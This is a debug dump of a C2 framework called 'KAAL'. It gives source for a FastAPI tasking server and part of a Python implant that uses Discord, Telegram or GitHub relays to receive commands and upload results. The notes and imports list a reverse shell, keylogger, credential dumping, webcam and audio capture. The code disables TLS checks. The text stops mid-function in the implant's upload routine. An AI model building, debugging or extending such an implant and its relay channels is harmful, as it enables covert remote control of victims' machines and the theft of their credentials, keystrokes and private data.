# KAAL Framework - Debug State Dump

## 1. What We Have Done (Phases 1-10)
- **JSON Serialization Fix**: Refactored the entire stack (`standalone_agent.py` and `web/server.py`) to pass Python dictionaries natively instead of stringifying JSON early. This fixed the React frontend `JSON.parse` errors caused by double-escaped literal newlines in Windows command output.
- **Discord Rate Limit Tuning**: Patched the `1.7 Billion Seconds` sleep bug in `discord_client.py` by using `time.time()` instead of asyncio loop time for the `X-RateLimit-Reset` epoch.
- **Ghost Processes Cleaned**: Discovered and killed 8 duplicate agent scripts that were simultaneously polling Discord and instantly exhausting the channel rate limit.
- **Polling Configuration**: Increased the Discord C2 profile polling interval to 4 seconds to safely stay under Discord's 5-requests-per-5-seconds channel history limit.
- **Feature Completion**: Finalized structured output for files, processes, interactive reverse shell, logging, and large payload chunking (Phase 10).

## 2. Where We Are
- The framework is now fully feature-complete according to the Roadmap.
- The WebSocket streaming, React dashboard, Server task queue, and Discord profile translator are all functional.
- The `standalone_agent.py` correctly handles interactive commands, standard commands, and large file chunking.

## 3. Current Problems / Issues
- **Discord API Rate Limits (HTTP 429)**: The primary remaining issue is strictly tuning the Discord API. If the server, profile, and agent poll too quickly, Discord issues temporary channel bans (HTTP 429) or disconnects (`Unclosed client session`). You may need to transition to Discord Webhooks or Gateway Websockets for real-time C2 rather than pure REST polling if you want sub-second latency.
- **Missing `agent_core.py`**: The `standalone_agent.py` logs `Warning: agent_core.py not found. Some features will be limited.` Ensure that the `agent_core.py` payload drops alongside the agent executable to access webcam, keylogger, and system privileges.

---

## Complete Source Code Dumps for Debugging


### File: `web/server.py`
```python
from fastapi import FastAPI, WebSocket, Request, HTTPException
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import Dict, Any, Optional, List
import asyncio
import json
import logging
from datetime import datetime

# Imoprt Core Modules
# Note: Ensure the root directory is in PYTHONPATH or install as package
import sys
import os
from pathlib import Path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from core.logger import setup_logger
from core.state_manager import terminal_state
from core.config import Config
from console.relay_manager import relay_manager

# Setup
log = setup_logger("web_server")
config = Config()
app = FastAPI(title="Kaal Framework API", version="4.0.0")

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# In-memory storage for agents (simplified for test)
# Key: agent_id, Value: Agent Data
agents: Dict[str, Dict[str, Any]] = {}

class CommandRequest(BaseModel):
    agent_id: str
    command: str
    parameters: Optional[Dict[str, Any]] = None

@app.get("/api/health")
async def health_check():
    return {"status": "ok", "version": "4.0.0"}

# --- Agent Interaction Endpoints (for Agents) ---

@app.post("/api/v1/register")
async def register_agent(request: Request):
    """
    Endpoint for agents to register themselves.
    Expected JSON: {"agent_id": "...", "platform": "...", "hostname": "...", ...}
    """
    try:
        data = await request.json()
        agent_id = data.get("agent_id")
        if not agent_id:
            raise HTTPException(status_code=400, detail="Missing agent_id")
        
        agents[agent_id] = {
            "id": agent_id,
            "platform": data.get("platform", "unknown"),
            "hostname": data.get("hostname", "unknown"),
            "internal_ip": request.client.host,
            "first_seen": datetime.now().isoformat(),
            "last_seen": datetime.now().isoformat(),
            "status": "active",
            "connection_type": "direct",  # direct vs proxy
            "tasks": []
        }
        log.info(f"Agent registered: {agent_id} ({data.get('hostname')})")
        
        # Broadcast to UI
        await terminal_state.broadcast("agent_registered", agents[agent_id])
        
        return {"status": "registered"}
    except Exception as e:
        log.error(f"Registration error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/v1/task/{agent_id}")
async def get_task(agent_id: str):
    """
    Endpoint for agents to poll for tasks.
    Returns the next pending task or empty string.
    """
    if agent_id not in agents:
        return "" # Or register?
    
    agent = agents[agent_id]
    agent["last_seen"] = datetime.now().isoformat()
    agent["status"] = "active"
    
    # Check for pending tasks
    if agent["tasks"]:
        return agent["tasks"].pop(0) # FIFO
    
    return ""

@app.post("/api/v1/result")
async def report_result(request: Request):
    """
    Endpoint for agents to report task results.
    Expected JSON: {"agent_id": "...", "task_id": "...", "result": "..."}
    """
    try:
        data = await request.json()
        agent_id = data.get("agent_id")
        result = data.get("result")
        
        if agent_id in agents:
            agents[agent_id]["last_seen"] = datetime.now().isoformat()
            log.info(f"Result from {agent_id}: {result[:50]}...")
            
            # Broadcast to UI
            await terminal_state.broadcast("task_result", {
                "agent_id": agent_id,
                "result": result
            })
            
        return {"status": "received"}
    except Exception as e:
        log.error(f"Result error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/v1/agent_message")
async def handle_agent_message(request: Request):
    """
    Unified endpoint for C2 Profiles (Mythic-style).
    Handles Register, Heartbeat, Result, and Task Fetching in one go.
    """
    try:
        data = await request.json()
        msg_type = data.get("type")
        agent_id = data.get("agent_id")
        
        if not agent_id:
            raise HTTPException(status_code=400, detail="Missing agent_id")

        response = {"status": "success", "tasks": []}

        # 0. Auto-Register if unknown (Robustness)
        if agent_id not in agents:
             agents[agent_id] = {
                "id": agent_id,
                "platform": data.get("platform", "unknown"),
                "hostname": data.get("hostname", "unknown"),
                "internal_ip": request.client.host,
                "first_seen": datetime.now().isoformat(),
                "last_seen": datetime.now().isoformat(),
                "status": "active",
                "connection_type": "c2_profile",
                "tasks": []
            }
            # Only broadcast if it's a real registration or we want to announce the "discovery"
             log.info(f"Agent discovered via C2 (Auto-Register): {agent_id}")
             await terminal_state.broadcast("agent_registered", agents[agent_id])

        # 1. Handle Registration
        if msg_type == "register":
            # Update specific fields if they were distinct
             agents[agent_id]["platform"] = data.get("platform", "unknown")
             agents[agent_id]["hostname"] = data.get("hostname", "unknown")
             log.info(f"Agent registered via C2: {agent_id}")
             await terminal_state.broadcast("agent_registered", agents[agent_id])
            
            
        # 2. Handle Heartbeat / Checkin
        elif msg_type == "heartbeat":
            if agent_id in agents:
                agents[agent_id]["last_seen"] = datetime.now().isoformat()
                agents[agent_id]["status"] = "active"
                
        # 3. Handle Result
        elif msg_type == "result":
            if agent_id in agents:
                agents[agent_id]["last_seen"] = datetime.now().isoformat()
                result_text = data.get("result", "")
                
                try:
                    if isinstance(result_text, str):
                        result_text = json.loads(result_text)
                except json.JSONDecodeError:
                    pass
                
                task_id = data.get("task_id", "unknown")
                log_preview = str(result_text)[:50] if result_text else ""
                log.info(f"Result from {agent_id} (Task {task_id}): {log_preview}...")
                
                await terminal_state.broadcast("task_result", {
                    "agent_id": agent_id,
                    "task_id": task_id,
                    "result": result_text
                })

        # 4. Handle Status / Ack
        elif msg_type == "ack":
             if agent_id in agents:
                agents[agent_id]["last_seen"] = datetime.now().isoformat()
                task_id = data.get("task_id", "unknown")
                log.info(f"ACK from {agent_id} for task {task_id}")
                await terminal_state.broadcast("task_status", {
                    "agent_id": agent_id,
                    "task_id": task_id,
                    "status": "acknowledged",
                    "message": "Agent received task"
                })

        elif msg_type == "status":
             if agent_id in agents:
                agents[agent_id]["last_seen"] = datetime.now().isoformat()
                task_id = data.get("task_id", "unknown")
                status = data.get("status", "processing")
                message = data.get("message", "")
                log.info(f"STATUS from {agent_id} (Task {task_id}): {status} - {message}")
                await terminal_state.broadcast("task_status", {
                    "agent_id": agent_id,
                    "task_id": task_id,
                    "status": status,
                    "message": message
                })

        # 5. Handle Chunked Upload (Phase 6)
        elif msg_type == "chunk":
             if agent_id in agents:
                agents[agent_id]["last_seen"] = datetime.now().isoformat()
                
                stream_id = data.get("stream_id")
                index = data.get("index")
                total = data.get("total")
                task_id = data.get("task_id", "unknown")
                chunk_data = data.get("data", "")
                
                if not stream_id or index is None or total is None:
                    return {"status": "error", "error": "Invalid chunk metadata"}

                # Init buffer
                if "partial_uploads" not in agents[agent_id]:
                    agents[agent_id]["partial_uploads"] = {}
                
                if stream_id not in agents[agent_id]["partial_uploads"]:
                    agents[agent_id]["partial_uploads"][stream_id] = {}
                
                # Store chunk
                agents[agent_id]["partial_uploads"][stream_id][index] = chunk_data
                received_count = len(agents[agent_id]["partial_uploads"][stream_id])
                
                log.info(f"Received chunk {index+1}/{total} from {agent_id} (Stream {stream_id})")
                
                # Check for completion
                if received_count >= total:
                    log.info(f"Reassembling stream {stream_id}...")
                    try:
                        # Sort and join
                        chunks = [agents[agent_id]["partial_uploads"][stream_id][i] for i in range(total)]
                        full_payload = "".join(chunks)
                        
                        # Process as new result message
                        try:
                            # Standardize to dict if it's a JSON string
                            if isinstance(full_payload, str):
                                full_payload = json.loads(full_payload)
                        except json.JSONDecodeError:
                            pass
                        
                        await terminal_state.broadcast("task_result", {
                            "agent_id": agent_id,
                            "task_id": task_id,
                            "result": full_payload
                        })
                        
                        del agents[agent_id]["partial_uploads"][stream_id]
                        log.info(f"Stream {stream_id} reassembled and broadcast.")
                    except Exception as e:
                        log.error(f"Reassembly error: {e}")

        # 6. Handle Interactive Shell Output (Phase 8)
        elif msg_type == "shell_output":
             if agent_id in agents:
                agents[agent_id]["last_seen"] = datetime.now().isoformat()
                output = data.get("data", "")
                log.info(f"Shell output from {agent_id}: {len(output)} bytes")
                
                await terminal_state.broadcast("shell_output", {
                    "agent_id": agent_id,
                    "output": output,
                    "timestamp": datetime.now().isoformat()
                })

        # 7. Handle Agent Logs (Phase 9)
        elif msg_type == "log":
             if agent_id in agents:
                agents[agent_id]["last_seen"] = datetime.now().isoformat()
                level = data.get("level", "INFO")
                message = data.get("message", "")
                timestamp = data.get("timestamp", time.time())
                
                log_entry = {
                    "level": level,
                    "message": message,
                    "timestamp": datetime.fromtimestamp(timestamp).isoformat()
                }
                
                if "logs" not in agents[agent_id]:
                    agents[agent_id]["logs"] = []
                
                # Keep last 100 logs
                agents[agent_id]["logs"].append(log_entry)
                if len(agents[agent_id]["logs"]) > 100:
                    agents[agent_id]["logs"].pop(0)
                    
                log.info(f"Agent {agent_id} LOG [{level}]: {message[:100]}")
                
                await terminal_state.broadcast("agent_log", {
                    "agent_id": agent_id,
                    "log": log_entry
                })

        # 5. Connect Pending Tasks (for all message types)
        if agent_id in agents and agents[agent_id]["tasks"]:
            # Get one task (FIFO)
            task_payload = agents[agent_id]["tasks"].pop(0)
            
            # Use stored Task ID if available (dict), else generate new one (str legacy)
            if isinstance(task_payload, dict):
                tid = task_payload.get("task_id", "unknown")
                cmd_str = task_payload.get("command", "")
            else:
                import uuid
                tid = str(uuid.uuid4())[:8]
                cmd_str = str(task_payload)
            
            response["tasks"].append({
                "type": "command", 
                "task_id": tid, 
                "command": cmd_str
            })
            log.info(f"Sent task {tid} to {agent_id} via C2 response")

        return response

    except Exception as e:
        log.error(f"Agent Message Error: {e}")
        # Return valid JSON even on error so Profile doesn't crash
        return {"status": "error", "error": str(e)}

@app.get("/api/v1/c2/tasks")
async def get_c2_tasks(platform: str = "discord"):
    """
    Endpoint for C2 Profiles to poll for pending tasks for ANY agent.
    This allows 'Push' style tasking without waiting for agent heartbeat.
    """
    pending_tasks = []
    
    # Iterate over all agents
    for agent_id, agent in agents.items():
        # Filter by connection type? For now, just check all tasks.
        # Ideally, we should filter by the C2 channel the agent is using.
        # But our simple Agents don't explicitly say "I am Discord" to the server until registration.
        # connection_type="c2_profile" is generic.
        
        if agent.get("tasks"):
            # Pop ONE task per agent to ensure fairness/order
            task_payload = agent["tasks"].pop(0)
            
            if isinstance(task_payload, dict):
                tid = task_payload.get("task_id", "unknown")
                cmd_str = task_payload.get("command", "")
            else:
                import uuid
                tid = str(uuid.uuid4())[:8]
                cmd_str = str(task_payload)
            
            pending_tasks.append({
                "type": "command",
                "agent_id": agent_id,
                "task_id": tid,
                "command": cmd_str
            })
            log.info(f"Pushed task {tid} to C2 poll for agent {agent_id}")
            
    return {"tasks": pending_tasks}

# --- Config & Plugin Endpoints (Phase 3) ---

@app.get("/api/config")
async def get_config():
    """Return the current configuration."""
    return config.data

@app.post("/api/config")
async def update_config(request: Request):
    """
    Update configuration.
    Expected JSON: {"key": "value"} or nested dicts to merge.
    """
    try:
        new_config = await request.json()
        # Deep merge or replace? For now, we'll do top-level keys update 
        # or rely on Config.set if key provided, but here we likely want full update
        # Simplified: Update top-level keys
        for k, v in new_config.items():
            config.set(k, v)
        return {"status": "updated", "config": config.data}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

from core.plugin_loader import PluginLoader
plugin_loader = PluginLoader([Path("plugins")])
plugin_loader.discover()

@app.get("/api/plugins")
async def list_plugins():
    """Return list of loaded plugins."""
    result = []
    for p_type, p_dict in plugin_loader.plugins.items():
        for p_id, plugin in p_dict.items():
            result.append({
                "id": plugin.id,
                "name": plugin.name,
                "version": plugin.version,
                "type": plugin.type,
                "description": getattr(plugin, "description", "No description")
            })
    return result

@app.post("/api/plugins/reload")
async def reload_plugins():
    """Reload all plugins from disk."""
    plugin_loader.discover()
    return {"status": "reloaded", "count": sum(len(d) for d in plugin_loader.plugins.values())}

# --- AI Copilot Endpoint (Phase 4.0) ---

class CopilotRequest(BaseModel):
    message: str

@app.post("/api/copilot")
async def copilot_chat(req: CopilotRequest):
    """
    Handle AI chat requests.
    Currently a mock response. In production, connect to LLM.
    """
    # Simulate processing time
    await asyncio.sleep(1.5) 
    
    # Simple keyword-based responses for demo
    msg = req.message.lower()
    response = "I am KAAL Copilot. I can assist with system administration and security auditing."
    
    if "hello" in msg or "hi" in msg:
        response = "Hello, Administrator. How can I assist you today?"
    elif "status" in msg:
        active = len([a for a in agents.values() if a['status'] == 'active'])
        response = f"System Status: Operational. {active} agents online."
    elif "scan" in msg or "audit" in msg:
        response = "I can initiate scans. Use the 'Credential Auditor' or 'UAC' modules in the dashboard."
    elif "help" in msg:
        response = "Available commands: status, scan, list agents, relay check."
        
    return {"response": response}

# --- UI Endpoints (for Frontend) ---

@app.get("/api/agents")
async def list_agents():
    return list(agents.values())

@app.post("/api/command")
async def queue_command(cmd: CommandRequest):
    """
    Queue a command for an agent (works for both direct and proxy agents).
    """
    if cmd.agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    agent = agents[cmd.agent_id]
    connection_type = agent.get("connection_type", "direct")
    
    # Format task
    task = cmd.command
    if cmd.parameters:
        # Append parameters if needed (simplified)
        pass
    
    if connection_type == "proxy":
        # Route through relay manager
        task_id = relay_manager.send_command(cmd.agent_id, task)
        if not task_id:
            raise HTTPException(status_code=500, detail="Failed to send command through relay")
        log.info(f"Sent command to proxy agent {cmd.agent_id}: {task}")
        
        await terminal_state.broadcast("task_created", {
            "agent_id": cmd.agent_id,
            "task_id": task_id,
            "command": task,
            "status": "pending",
            "timestamp": datetime.now().isoformat()
        })
        return {"status": "sent", "task_id": task_id, "via": "relay"}
    else:
        # Direct agent - queue locally
        import uuid
        task_id = str(uuid.uuid4())[:8]
        # In simple queue, we just store command string. 
        # But we should use dicts to track IDs properly. 
        # For backward compat with existing `handle_agent_message` pop logic, we keep string 
        # BUT we MUST transition `handle_agent_message` to support dicts or encode ID.
        # Let's keep storing string but broadcast the ID we generated.
        # The agent expects a string command OR a dict. 
        # Current agent implementation accepts string.
        # Current server implementation for `handle_agent_message` wraps it in dict with NEW ID.
        # This mismatch means the ID we broadcast here is NOT the ID sent to agent!!!!
        # FIX: We need to store structured task in agents[id]["tasks"] = [{"id":..., "cmd":...}]
        # But `handle_agent_message` lines 199-219 pop string.
        # Let's store string as `ID:CMD` and have handle_agent_message parse it? 
        # No, better to change agents structure to list of dicts.
        
        # ACTUALLY, line 206 inside handle_agent_message generates a NEW ID.
        # This is bad. We can't track it if ID changes.
        # We must change `handle_agent_message` logic. 
        
        # For now, let's just broadcast "pending" and hope for best? No.
        # Let's start storing dicts in tasks list: {"task_id": tid, "command": task}
        agents[cmd.agent_id]["tasks"].append({"task_id": task_id, "command": task})
        
        log.info(f"Queued task {task_id} for direct agent {cmd.agent_id}: {task}")
        await terminal_state.broadcast("task_created", {
            "agent_id": cmd.agent_id,
            "task_id": task_id,
            "command": task,
            "status": "pending",
            "timestamp": datetime.now().isoformat()
        })
        return {"status": "queued", "task_id": task_id, "task": task}


@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await terminal_state.register_client(websocket)
    # Send initial state
    await websocket.send_json({
        "type": "agent_list",
        "data": list(agents.values())
    })
    try:
        while True:
            data = await websocket.receive_text()
            # Handle incoming WebSocket messages if needed
    except Exception:
        terminal_state.remove_client(websocket)

# --- Relay Management Endpoints ---

class RelayAddRequest(BaseModel):
    relay_type: str  # "telegram", "discord", or "github"
    relay_id: str
    token: str
    chat_id: Optional[str] = None
    channel_id: Optional[str] = None
    gist_id: Optional[str] = None

@app.post("/api/relay/add")
async def add_relay(req: RelayAddRequest):
    """Add a new relay (Telegram/Discord)"""
    try:
        if req.relay_type == "telegram":
            if not req.chat_id:
                raise HTTPException(status_code=400, detail="chat_id required for Telegram")
            relay_manager.add_telegram_relay(req.relay_id, req.token, req.chat_id)
        elif req.relay_type == "discord":
            if not req.channel_id:
                raise HTTPException(status_code=400, detail="channel_id required for Discord")
            relay_manager.add_discord_relay(req.relay_id, req.token, req.channel_id)
        elif req.relay_type == "github":
            if not req.gist_id:
                raise HTTPException(status_code=400, detail="gist_id required for GitHub")
            relay_manager.add_github_relay(req.relay_id, req.token, req.gist_id)
        else:
            raise HTTPException(status_code=400, detail="Invalid relay_type")
        
        log.info(f"Added {req.relay_type} relay: {req.relay_id}")
        return {"status": "ok", "relay_id": req.relay_id}
    except Exception as e:
        log.error(f"Add relay error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/relay/list")
async def list_relays():
    """List all active relays"""
    return {"relays": relay_manager.get_relays()}

@app.delete("/api/relay/{relay_type}/{relay_id}")
async def remove_relay(relay_type: str, relay_id: str):
    """Remove a relay"""
    relay_manager.remove_relay(relay_type, relay_id)
    return {"status": "removed"}

@app.get("/api/relay/agents")
async def list_proxy_agents():
    """List all proxy agents and merge into main agents dict"""
    proxy_agents = relay_manager.get_agents()
    
    # Merge proxy agents into main agents dict
    for agent_data in proxy_agents:
        agent_id = agent_data["agent_id"]
        if agent_id not in agents:
            # Transform proxy agent data to match main agent format
            agents[agent_id] = {
                "id": agent_id,
                "platform": agent_data.get("platform", "unknown"),
                "hostname": agent_data.get("hostname", "unknown"),
                "internal_ip": "127.0.0.1", # Default for proxy
                "username": "unknown",
                "first_seen": datetime.fromtimestamp(agent_data["first_seen"]).isoformat(),
                "last_seen": datetime.fromtimestamp(agent_data["last_seen"]).isoformat(),
                "status": "active",
                "connection_type": "proxy",
                "relay_type": agent_data.get("relay_id", "unknown"),
                "tasks": []
            }
            
    return {"agents": list(proxy_agents)}

# --- WebSocket Broadcasting Bridge ---

# Global event loop reference
app_loop = None

@app.on_event("startup")
async def startup_event():
    global app_loop
    app_loop = asyncio.get_running_loop()
    # Start background tasks
    asyncio.create_task(check_agent_status())

async def check_agent_status():
    """Background task to check for dead agents."""
    while True:
        try:
            now = datetime.now()
            for agent_id, agent in list(agents.items()):
                last_seen_str = agent.get("last_seen")
                if not last_seen_str: continue
                
                try:
                    last_seen = datetime.fromisoformat(last_seen_str)
                    delta = (now - last_seen).total_seconds()
                    
                    if delta > 60 and agent.get("status") != "offline":
                        log.warning(f"Agent {agent_id} marked OFFLINE (last seen {int(delta)}s ago)")
                        agent["status"] = "offline"
                        # Broadcast update
                        await terminal_state.broadcast("agent_updated", agent)
                        
                except ValueError:
                    continue # Bad timestamp format
                    
            await asyncio.sleep(10) # Check every 10 seconds
        except Exception as e:
            log.error(f"Status check error: {e}")
            await asyncio.sleep(10)

async def _broadcast_async(event: str, data: dict):
    """Actual async broadcast logic"""
    if event == "agent_connected":
        # Add proxy agent to main dict
        agent_id = data.get("agent_id")
        if agent_id:
            agents[agent_id] = {
                "id": agent_id,
                "platform": data.get("platform", "unknown"),
                "hostname": data.get("hostname", "unknown"),
                "first_seen": datetime.now().isoformat(),
                "last_seen": datetime.now().isoformat(),
                "status": "active",
                "connection_type": "proxy",
                "relay_type": data.get("relay", "unknown"),
                "tasks": []
            }
            await terminal_state.broadcast("agent_registered", agents[agent_id])
    elif event == "task_result":
        # Broadcast result to GUI
        await terminal_state.broadcast("task_result", data)
    elif event == "task_status":
        # Broadcast status update (ack, processing)
        await terminal_state.broadcast("task_status", data)

def relay_to_websocket_callback(event: str, data: dict):
    """Callback from RelayManager (runs in thread), schedules async broadcast"""
    if app_loop:
        asyncio.run_coroutine_threadsafe(_broadcast_async(event, data), app_loop)

# Register callback
relay_manager.register_callback(relay_to_websocket_callback)

# Serve Frontend
static_dir = Path(__file__).parent / "static"
if static_dir.exists():
    app.mount("/assets", StaticFiles(directory=static_dir), name="assets")
    app.mount("/static", StaticFiles(directory=static_dir), name="static_alias") # Ensure /static works too

# Mount Logos Directory
logos_path = Path("logos").resolve()
if not logos_path.exists():
    # Try relative to this file
    logos_path = (Path(__file__).parent.parent / "logos").resolve()

if logos_path.exists():
    print(f" [+] Mounting /logos from {logos_path}")
    app.mount("/logos", StaticFiles(directory=logos_path), name="logos")
else:
    print(f" [!] Warning: 'logos' directory not found at {logos_path}")

from fastapi.responses import FileResponse, HTMLResponse

@app.get("/{full_path:path}")
async def serve_static_app(full_path: str):
    # API requests are already handled by specific routes above due to order
    if full_path.startswith("api"):
        raise HTTPException(status_code=404, detail="API endpoint not found")
        
    index = static_dir / "index.html"
    if index.exists():
        return FileResponse(index)
    return HTMLResponse("<h1>KAAL Web Console</h1><p>NEBULA Console not found in web/static/index.html.</p>")

if __name__ == "__main__":
    import uvicorn
    print("\n" + "="*50)
    print(" KAAL C2 SERVER STARTING...")
    print("="*50)
    print(f" [+] Web Interface: http://localhost:5000")
    print(f" [+] API Endpoint:  http://localhost:5000/api")
    print("="*50 + "\n")
    uvicorn.run("web.server:app", host="0.0.0.0", port=5000, reload=True)


```

### File: `standalone_agent.py`
```python
"""
KAAL Agent – Professional Grade (Phase 1 Enhanced)
Features:
- Full integration with `agent_core` module
- Structured JSON output for all commands
- Multi-Relay support (Discord/Telegram/GitHub)
- Robust error handling and configuration
"""

import time
import platform
import json
import logging
from logging.handlers import RotatingFileHandler
import urllib.request
import urllib.parse
import ssl
import os
import sys
import subprocess
import base64
import threading
import ctypes
import uuid
import socket

# Try to import core features; if missing, some cmds will fail gracefully
try:
    from agent_core import (
        get_real_screenshot, get_real_location,
        list_directory_json, get_process_list_struct,
        get_system_info_struct, get_network_config_struct,
        ping_host_struct, dump_credentials,
        record_audio, start_keylogger, stop_keylogger, 
        get_keylogs, list_directory, KEYLOGGER_ACTIVE, KEYLOGS
    )
    CORE_AVAILABLE = True
except ImportError:
    CORE_AVAILABLE = False
    print("[-] Warning: agent_core.py not found. Some features will be limited.")

# ==================== CONFIGURATION & STATE ====================
CURRENT_RELAY_TYPE = "discord"
RELAY_CONFIG = {
    "github": {
        "token": "YOUR_GITHUB_PAT_HERE",
        "gist_id": "f7469bd497be819b3fe1485aa5b48ce9"
    },
    "telegram": {
        "token": "",
        "chat_id": ""
    },
    "discord": {
        "token": "YOUR_DISCORD_BOT_TOKEN_HERE",
        "channel_id": "1471272917403697248"
    }
}
AGENT_ID = f"vm-agent-{platform.node()}-{uuid.uuid4().hex[:8]}"
HEARTBEAT_SEC = 30
POLL_SEC = 5
BURST_UNTIL = 0
CURRENT_CWD = os.getcwd()

# SSL context
_ctx = ssl.create_default_context()
_ctx.check_hostname = False
_ctx.verify_mode = ssl.CERT_NONE

def trigger_burst(duration=30):
    global BURST_UNTIL
    BURST_UNTIL = time.time() + duration

def is_burst_mode():
    return time.time() < BURST_UNTIL

# ==================== RATE LIMITER ====================
class RateLimiter:
    def __init__(self, max_tokens=60, refill_rate=1.0):
        """
        Token Bucket Rate Limiter.
        max_tokens: Maximum burst size.
        refill_rate: Tokens per second.
        """
        self.capacity = max_tokens
        self.tokens = max_tokens
        self.rate = refill_rate
        self.last_refill = time.time()
        self.lock = threading.Lock()

    def _refill(self):
        now = time.time()
        elapsed = now - self.last_refill
        new_tokens = elapsed * self.rate
        if new_tokens > 0:
            self.tokens = min(self.capacity, self.tokens + new_tokens)
            self.last_refill = now

    def try_acquire(self, tokens=1):
        with self.lock:
            self._refill()
            if self.tokens >= tokens:
                self.tokens -= tokens
                return True
            return False

    def wait_for_token(self, tokens=1):
        while True:
            with self.lock:
                self._refill()
                if self.tokens >= tokens:
                    self.tokens -= tokens
                    return
                # Calculate wait time
                needed = tokens - self.tokens
                wait_time = needed / self.rate
            
            time.sleep(min(wait_time, 1.0))


# ==================== CONFIG FRAMEWORK ====================
def load_config():
    global HEARTBEAT_SEC, POLL_SEC, RELAY_CONFIG, CURRENT_RELAY_TYPE
    config_path = "agent_config.json"
    
    if os.path.exists(config_path):
        try:
            with open(config_path, "r") as f:
                config = json.load(f)
                
            logger.info(f"Loading configuration from {config_path}")
            
            # Update globals if present in config
            if "heartbeat_sec" in config: HEARTBEAT_SEC = config["heartbeat_sec"]
            if "poll_sec" in config: POLL_SEC = config["poll_sec"]
            if "relay_type" in config: CURRENT_RELAY_TYPE = config["relay_type"]
            
            # Deep merge relay config
            if "relay_config" in config:
                for r_type, r_data in config["relay_config"].items():
                    if r_type in RELAY_CONFIG:
                        RELAY_CONFIG[r_type].update(r_data)
                    else:
                        RELAY_CONFIG[r_type] = r_data
                        
        except Exception as e:
            logger.error(f"Failed to load config: {e}")
    else:
        logger.info("No config file found. Using internal defaults.")

# ==================== RELAY ABSTRACTION ====================
class RelayBase:
    def send_registration(self): pass
    def send_heartbeat(self): pass
    def poll_commands(self): return []
    def send_ack(self, task_id): pass
    def send_status(self, task_id, status, msg=""): pass
    def send_result(self, task_id, result): pass
    def send_log(self, level, message): pass

class DiscordRelay(RelayBase):
    def __init__(self, config):
        self.token = config.get("token")
        self.channel_id = config.get("channel_id")
        self.last_msg_id = None
        self.ua = "KAAL-DiscordC2/1.0"
        # 60 requests/min = 1 req/sec. Burst 10.
        self.limiter = RateLimiter(max_tokens=10, refill_rate=1.0)
        
    def _api(self, method, endpoint, data=None):
        # WAIT for rate limit token before every request
        # For critical ops, we wait. For polling, we might skip, but let's enforce hygiene.
        self.limiter.wait_for_token()

        url = f"https://discord.com/api/v10/{endpoint}"
        headers = {
            "Authorization": f"Bot {self.token}",
            "Content-Type": "application/json",
            "User-Agent": self.ua
        }
        
        # Exponential Backoff for 429/Errors
        base_delay = 2
        max_delay = 60
        
        for attempt in range(5):
            try:
                if data:
                    req = urllib.request.Request(url, data=json.dumps(data).encode(), headers=headers, method=method)
                else:
                    req = urllib.request.Request(url, headers=headers, method=method)
                
                with urllib.request.urlopen(req, timeout=10, context=_ctx) as r:
                    return json.loads(r.read().decode())
            
            except urllib.error.HTTPError as e:
                if e.code == 429:
                    try:
                        retry_after = json.loads(e.read().decode()).get("retry_after", base_delay)
                        logger.warning(f"Rate Limited (429). Sleeping {retry_after}s...")
                        time.sleep(retry_after)
                        continue # Retry immediately after sleep
                    except: 
                        pass
                
                # Other errors
                delay = min(max_delay, base_delay * (2 ** attempt))
                # print(f"[-] HTTP Error {e.code}. Retrying in {delay}s...")
                time.sleep(delay)
            
            except Exception as e:
                delay = min(max_delay, base_delay * (2 ** attempt))
                time.sleep(delay)
                
        return None

    def _encode(self, data):
        """Mythic-style encoding: base64(agent_id + : + json)"""
        try:
            payload = json.dumps(data)
            combined = f"{AGENT_ID}:{payload}"
            return base64.b64encode(combined.encode()).decode()
        except: return ""

    def _decode(self, encoded):
        try:
            decoded = base64.b64decode(encoded).decode()
            if ":" not in decoded: return None
            aid, payload = decoded.split(":", 1)
            if aid == AGENT_ID:
                return json.loads(payload)
            return None
        except: return None

    def send_registration(self):
        msg = {
            "type": "register",
            "agent_id": AGENT_ID,
            "platform": platform.system().lower(),
            "hostname": platform.node(),
            "timestamp": time.time(),
            "architecture": platform.machine(),
            "username": os.environ.get("USERNAME", "unknown"),
            "pid": os.getpid()
        }
        encoded = self._encode(msg)
        self._api("POST", f"channels/{self.channel_id}/messages", {"content": f"KAAL_AGT:{encoded}"})

    def send_heartbeat(self):
        msg = {"type": "heartbeat", "agent_id": AGENT_ID, "timestamp": time.time()}
        encoded = self._encode(msg)
        self._api("POST", f"channels/{self.channel_id}/messages", {"content": f"KAAL_AGT:{encoded}"})
        logger.debug(f"[♥] (Discord C2)")

    def poll_commands(self):
        endpoint = f"channels/{self.channel_id}/messages?limit=10"
        if self.last_msg_id: endpoint += f"&after={self.last_msg_id}"
        
        res = self._api("GET", endpoint)
        cmds = []
        
        if res and isinstance(res, list):
            try:
                res.sort(key=lambda x: int(x["id"]))
                if res: self.last_msg_id = res[-1]["id"]
                
                for m in res:
                    content = m.get("content", "")
                    if content.startswith("KAAL_SVR:"):
                        try:
                            payload = self._decode(content[9:])
                            if payload and payload.get("type") == "command":
                                tid = payload.get("task_id")
                                cmd = payload.get("command")
                                cmds.append((tid, cmd))
                        except Exception: pass
            except Exception: pass
        return cmds

    def _upload_large(self, encoded_payload):
        # Respect rate limit for large uploads too
        self.limiter.wait_for_token()

        boundary = "----WebKitFormBoundary" + uuid.uuid4().hex
        filename = "response.txt"
        file_content = f"KAAL_AGT:{encoded_payload}".encode()
        
        body = []
        body.append(f'--{boundary}'.encode())
        body.append(f'Content-Disposition: form-data; name="files[0]"; filename="{filename}"'.encode())
        body.append('Content-Type: text/plain'.encode())
        body.append(b'')
        body.append(file_content)
        body.append(f'--{boundary}--'.encode())
        body.append(b'')
        
        payload = b'\r\n'.join(body)
        url = f"https://discord.com/api/v10/channels/{self.channel_id}/messages"
        headers = {
            "Authorization": f"Bot {self.token}",
            "User-Agent": self.ua,
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Content-Length": str(len(payload))
        }
        
        try:
            req = urllib.request.Request(url, data=payload, headers=headers, method="POST")
